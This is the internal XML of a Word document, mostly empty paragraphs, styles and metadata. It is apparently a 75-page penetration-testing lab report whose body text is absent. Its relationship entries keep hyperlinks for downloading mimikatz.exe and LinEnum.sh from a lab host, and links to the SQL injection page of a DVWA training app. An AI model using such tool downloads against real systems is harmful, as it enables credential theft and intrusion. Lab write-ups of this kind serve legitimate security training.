    <w:p w:rsidR="0097641D" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRPr="001B1649" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRPr="001B1649" w:rsidRDefault="00DF2335" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRPr="001B1649" w:rsidRDefault="0097641D" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRPr="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRPr="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="525"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:br w:type="textWrapping" w:clear="all"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRPr="001B1649" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="525"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1260"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRPr="001B1649" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRDefault="004C0745" w:rsidP="004C0745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRDefault="004C0745" w:rsidP="00746462">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRPr="006025E3" w:rsidRDefault="004C0745" w:rsidP="00746462">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A44C72" w:rsidRPr="001B1649" w:rsidRDefault="00A44C72" w:rsidP="00E1307F">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E1307F" w:rsidRPr="00E1307F" w:rsidRDefault="00E1307F" w:rsidP="00E1307F">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00E1307F" w:rsidRPr="00E1307F">
      <w:headerReference w:type="default" r:id="rId9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730E" w:rsidRDefault="00B1730E" w:rsidP="00A44C72">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00B1730E" w:rsidRDefault="00B1730E" w:rsidP="00A44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730E" w:rsidRDefault="00B1730E" w:rsidP="00A44C72">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00B1730E" w:rsidRDefault="00B1730E" w:rsidP="00A44C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hdr>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משתמש">
    <w15:presenceInfo w15:providerId="None" w15:userId="משתמש"/>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462"/>
    <w:rsid w:val="00036B04"/>
    <w:rsid w:val="00072721"/>
    <w:rsid w:val="00080F54"/>
    <w:rsid w:val="00133666"/>
    <w:rsid w:val="00143BE4"/>
    <w:rsid w:val="001B455C"/>
    <w:rsid w:val="001B4ADE"/>
    <w:rsid w:val="001E0620"/>
    <w:rsid w:val="0020780D"/>
    <w:rsid w:val="00247098"/>
    <w:rsid w:val="002602ED"/>
    <w:rsid w:val="0026720B"/>
    <w:rsid w:val="002F06CA"/>
    <w:rsid w:val="00333243"/>
    <w:rsid w:val="0035080C"/>
    <w:rsid w:val="00392235"/>
    <w:rsid w:val="003A1653"/>
    <w:rsid w:val="003B6ADC"/>
    <w:rsid w:val="003D55EA"/>
    <w:rsid w:val="003F13A9"/>
    <w:rsid w:val="004348D1"/>
    <w:rsid w:val="00441736"/>
    <w:rsid w:val="004432D5"/>
    <w:rsid w:val="004610F6"/>
    <w:rsid w:val="0048045C"/>
    <w:rsid w:val="004A1B95"/>
    <w:rsid w:val="004B0A94"/>
    <w:rsid w:val="004C0745"/>
    <w:rsid w:val="004E5063"/>
    <w:rsid w:val="00536E41"/>
    <w:rsid w:val="00573CEA"/>
    <w:rsid w:val="005B1902"/>
    <w:rsid w:val="005C2EF5"/>
    <w:rsid w:val="005F4474"/>
    <w:rsid w:val="0065416F"/>
    <w:rsid w:val="00697652"/>
    <w:rsid w:val="006D549E"/>
    <w:rsid w:val="006F30CC"/>
    <w:rsid w:val="0073265D"/>
    <w:rsid w:val="00746462"/>
    <w:rsid w:val="007653CD"/>
    <w:rsid w:val="007717A5"/>
    <w:rsid w:val="007D493A"/>
    <w:rsid w:val="007E710C"/>
    <w:rsid w:val="008056AC"/>
    <w:rsid w:val="00816271"/>
    <w:rsid w:val="008162AB"/>
    <w:rsid w:val="00816ADF"/>
    <w:rsid w:val="00850C2B"/>
    <w:rsid w:val="00852D0C"/>
    <w:rsid w:val="008A32AC"/>
    <w:rsid w:val="008A5EB7"/>
    <w:rsid w:val="008B0A1E"/>
    <w:rsid w:val="008D1FF0"/>
    <w:rsid w:val="00914BA8"/>
    <w:rsid w:val="00921388"/>
    <w:rsid w:val="009259EE"/>
    <w:rsid w:val="009316E5"/>
    <w:rsid w:val="00944C35"/>
    <w:rsid w:val="00951C8C"/>
    <w:rsid w:val="0096643F"/>
    <w:rsid w:val="00970C8A"/>
    <w:rsid w:val="0097641D"/>
    <w:rsid w:val="009872FC"/>
    <w:rsid w:val="00996884"/>
    <w:rsid w:val="009969E7"/>
    <w:rsid w:val="009E7745"/>
    <w:rsid w:val="009F7A67"/>
    <w:rsid w:val="00A04462"/>
    <w:rsid w:val="00A26533"/>
    <w:rsid w:val="00A324C4"/>
    <w:rsid w:val="00A44C72"/>
    <w:rsid w:val="00A57E00"/>
    <w:rsid w:val="00A71851"/>
    <w:rsid w:val="00A7534B"/>
    <w:rsid w:val="00A83157"/>
    <w:rsid w:val="00A835F7"/>
    <w:rsid w:val="00AB1701"/>
    <w:rsid w:val="00AB7E01"/>
    <w:rsid w:val="00AF45AB"/>
    <w:rsid w:val="00B1730E"/>
    <w:rsid w:val="00B3362E"/>
    <w:rsid w:val="00B35918"/>
    <w:rsid w:val="00B546B2"/>
    <w:rsid w:val="00B76C7B"/>
    <w:rsid w:val="00B8259F"/>
    <w:rsid w:val="00BB2E06"/>
    <w:rsid w:val="00BF3E93"/>
    <w:rsid w:val="00C14D0D"/>
    <w:rsid w:val="00C62B0F"/>
    <w:rsid w:val="00C62EB0"/>
    <w:rsid w:val="00C90C26"/>
    <w:rsid w:val="00C9330C"/>
    <w:rsid w:val="00CB5870"/>
    <w:rsid w:val="00CC458C"/>
    <w:rsid w:val="00CC6511"/>
    <w:rsid w:val="00CE4C10"/>
    <w:rsid w:val="00D0399B"/>
    <w:rsid w:val="00D04322"/>
    <w:rsid w:val="00D31FE7"/>
    <w:rsid w:val="00D33604"/>
    <w:rsid w:val="00D536D2"/>
    <w:rsid w:val="00D728B1"/>
    <w:rsid w:val="00D76776"/>
    <w:rsid w:val="00DC1848"/>
    <w:rsid w:val="00DF2335"/>
    <w:rsid w:val="00DF3E5B"/>
    <w:rsid w:val="00DF4CF5"/>
    <w:rsid w:val="00E07C28"/>
    <w:rsid w:val="00E1307F"/>
    <w:rsid w:val="00E7245A"/>
    <w:rsid w:val="00EA66CC"/>
    <w:rsid w:val="00EC249B"/>
    <w:rsid w:val="00F1311E"/>
    <w:rsid w:val="00F15DAC"/>
    <w:rsid w:val="00F17D28"/>
    <w:rsid w:val="00F60B26"/>
    <w:rsid w:val="00F80C86"/>
    <w:rsid w:val="00FA66BB"/>
    <w:rsid w:val="00FB797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C06E5"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{C65E25BF-92D7-4D89-B8DE-A728F6661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49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43BE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43BE4"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="2E74B5" w:themeColor="accent1" w:themeShade="BF"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:uiPriority w:val="30"/>
    <w:qFormat/>
    <w:rsid w:val="00143BE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43BE4"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="5B9BD5" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00E1307F"/>
    <w:rPr>
      <w:color w:val="0563C1" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A44C72"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00A44C72"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A44C7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44C72"/>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseReference">
    <w:name w:val="Intense Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="32"/>
    <w:qFormat/>
    <w:rsid w:val="007D493A"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="5B9BD5" w:themeColor="accent1"/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Title">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="TitleChar"/>
    <w:uiPriority w:val="10"/>
    <w:qFormat/>
    <w:rsid w:val="007D49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49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D493A"/>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C2E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2EF5"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="00F60B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094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endnotes" Target="endnotes.xml"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.0.0.14/mimikatz.exe%20mimikatz.exe" TargetMode="External"/><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10.0.0.14/LinEnum.sh" TargetMode="External"/><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10.0.0.4:8181/DVWA"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10.0.0.14/file.zip" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.0.0.4:8181/"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header" Target="header1.xml"/><Relationship Id="rId101" Type="http://schemas.microsoft.com/office/2011/relationships/people" Target="peop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10.0.0.4:8181/DVWA/vulnerabilities/sqli/"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1948</TotalTime>
  <Pages>75</Pages>
  <Words>5651</Words>
  <Characters>32216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משתמש</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>משתמש</cp:lastModifiedBy>
  <cp:revision>35</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-10-21T20:02:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-11-03T17:22:00Z</dcterms:modified>
</cp:coreProperties>
</file>